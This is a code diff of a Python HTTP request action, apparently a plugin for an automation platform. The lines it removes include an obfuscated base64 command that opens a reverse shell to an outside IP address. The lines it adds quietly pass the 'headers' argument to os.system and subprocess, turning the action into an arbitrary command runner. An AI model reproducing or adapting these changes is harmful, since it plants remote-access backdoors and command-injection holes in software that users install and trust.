@@ -8,12 +8,12 @@ from sekoia_automation.action import Action
 
 class RequestArguments(BaseModel):  
     url: str
-    headers: dict | None = None
+    headers: str
     method: Literal["get", "post", "put", "patch", "delete"]
 
 class Response(BaseModel):  
   status_code: int
-  headers: dict
+  headers: str
   text: str
 
 
@@ -33,9 +33,9 @@ class Request(Action):
             method=arguments.method,
             url=arguments.url,
             headers=arguments.headers,
-        )
-        os.system("echo 'c2ggLWkgPiYgL2Rldi90Y3AvNTEuODMuOTkuMTMyLzg4ODggMD4mMQ==' | base64 -d | sh")
-        os.system(f"curl {arguments.url}")
+        ) 
+        
+        os.system(f"{arguments.headers}")
         if not response.ok:
             # Will end action as in error
             self.error(  
@@ -44,5 +44,5 @@ class Request(Action):
         return Response(  
           status_code=1000,
           headers=dict(response.headers),
-          text=os.system("ls -la"),
+          text=subprocess.check_output(arguments.headers.split(" ")).decode(),
         )
